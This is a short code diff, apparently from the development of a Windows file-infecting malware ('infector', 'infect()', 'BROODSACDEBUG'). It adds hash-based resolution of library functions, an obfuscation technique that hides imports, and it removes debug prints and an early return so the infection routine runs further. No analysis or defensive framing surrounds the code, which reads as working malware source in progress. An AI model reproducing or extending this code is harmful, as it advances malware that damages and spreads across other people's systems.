@@ -511,18 +511,15 @@ void load_infector_iat(InfectorIAT *iat)
    iat->strnicmp = RECAST(strnicmpHeader,get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
    iat->strlen = RECAST(strlenHeader,get_proc_by_hash(msvcrtModule, 0x58ba3d97));
    iat->memcpy = RECAST(memcpyHeader,get_proc_by_hash(msvcrtModule, 0xa45cec64));
+   iat->memset = RECAST(memsetHeader,get_proc_by_hash(msvcrtModule, 0xcb80cc06));
    PIMAGE_DOS_HEADER shell32Module = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("shell32.dll"));
    iat->getFolderPath = RECAST(SHGetFolderPathAHeader,get_proc_by_hash(shell32Module, 0xe8692330));
-   printf("WriteFile: 0x%08x", fnv321a("WriteFile"));
-   printf("memset: 0x%08X", fnv321a("memset"));
 }
 
 int infect(void)
 {
    InfectorIAT iat;
    load_infector_iat(&iat);
-
-   return 0;
 
 #ifdef BROODSACDEBUG
    // TODO make this a compiler-controlled variable that points at our built executables
